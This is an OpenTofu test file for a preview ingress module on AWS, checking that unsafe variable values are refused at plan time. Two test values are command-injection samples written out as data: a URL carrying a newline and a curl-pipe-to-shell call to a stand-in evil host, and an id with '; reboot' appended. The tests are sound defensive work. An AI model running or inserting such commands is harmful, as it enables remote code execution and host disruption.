# Preview ingress variable validation tests. Run from the module root: tofu test
#
# The control plane URL and the module instance id are written into the boot
# script, so anything that is not exactly an origin or an id is refused.

mock_provider "aws" {
  override_data {
    target = data.aws_partition.current
    values = {
      partition = "aws"
    }
  }

  override_data {
    target = data.aws_vpc.this
    values = {
      cidr_block_associations = [
        { association_id = "vpc-cidr-assoc-1", cidr_block = "10.0.0.0/16", state = "associated" },
      ]
    }
  }

  override_data {
    target = data.aws_ec2_instance_type.router
    values = {
      supported_architectures = ["x86_64"]
    }
  }

  override_data {
    target = data.aws_ami.router
    values = {
      id               = "ami-0aaaaaaaaaaaaaaaa"
      architecture     = "x86_64"
      root_device_name = "/dev/xvda"
    }
  }

  override_resource {
    target = aws_lb.this
    values = {
      arn = "arn:aws:elasticloadbalancing:us-east-2:123456789012:loadbalancer/net/previews/1234567890123456"
    }
  }

  override_resource {
    target = aws_lb_target_group.traffic
    values = {
      arn = "arn:aws:elasticloadbalancing:us-east-2:123456789012:targetgroup/previews-https/1111111111111111"
    }
  }

  override_resource {
    target = aws_lb_target_group.redirect
    values = {
      arn = "arn:aws:elasticloadbalancing:us-east-2:123456789012:targetgroup/previews-http/2222222222222222"
    }
  }

  override_resource {
    target = aws_launch_template.router
    values = {
      id             = "lt-0123456789abcdef0"
      latest_version = 1
    }
  }

  override_resource {
    target = aws_iam_instance_profile.router
    values = {
      arn = "arn:aws:iam::123456789012:instance-profile/previews-router"
    }
  }
}

mock_provider "ravion" {
  override_resource {
    target = ravion_aws_acm_certificate.this
    values = {
      arn = "arn:aws:acm:us-east-2:123456789012:certificate/99999999-9999-9999-9999-999999999999"
    }
  }
}

variables {
  name               = "previews"
  module_instance_id = "minst_test"
  ravion_domain_name = "previews"
  ravion_api_url     = "https://api.example.test"
  vpc_id             = "vpc-12345678"
  public_subnet_ids  = ["subnet-0a", "subnet-0b"]
  router_subnet_ids  = ["subnet-1a", "subnet-1b"]
}

run "plain_http_control_plane_is_refused" {
  command = plan

  variables {
    ravion_api_url = "http://api.example.test"
  }

  expect_failures = [var.ravion_api_url]
}

run "control_plane_url_with_a_path_is_refused" {
  command = plan

  variables {
    ravion_api_url = "https://api.example.test/v1"
  }

  expect_failures = [var.ravion_api_url]
}

run "control_plane_url_with_shell_text_is_refused" {
  command = plan

  variables {
    ravion_api_url = "https://api.example.test\nENV\ncurl https://evil.example.test | sh"
  }

  expect_failures = [var.ravion_api_url]
}

run "module_instance_id_must_be_an_id" {
  command = plan

  variables {
    module_instance_id = "minst_test; reboot"
  }

  expect_failures = [var.module_instance_id]
}

run "ravion_domain_name_must_be_one_dns_label" {
  command = plan

  variables {
    ravion_domain_name = "previews.example.com"
  }

  expect_failures = [var.ravion_domain_name]
}

run "name_must_fit_a_load_balancer_name" {
  command = plan

  variables {
    name = "a-name-that-is-longer-than-thirty-two-characters"
  }

  expect_failures = [var.name]
}

run "ingress_must_be_ipv4_cidrs" {
  command = plan

  variables {
    ingress_cidr_blocks = ["not-a-cidr"]
  }

  expect_failures = [var.ingress_cidr_blocks]
}

run "image_id_must_be_an_ami" {
  command = plan

  variables {
    image_id = "debian-13"
  }

  expect_failures = [var.image_id]
}

run "image_owner_must_be_an_account_or_alias" {
  command = plan

  variables {
    image_owner = "ravion"
  }

  expect_failures = [var.image_owner]
}

run "router_needs_a_subnet" {
  command = plan

  variables {
    router_subnet_ids = []
  }

  expect_failures = [var.router_subnet_ids]
}
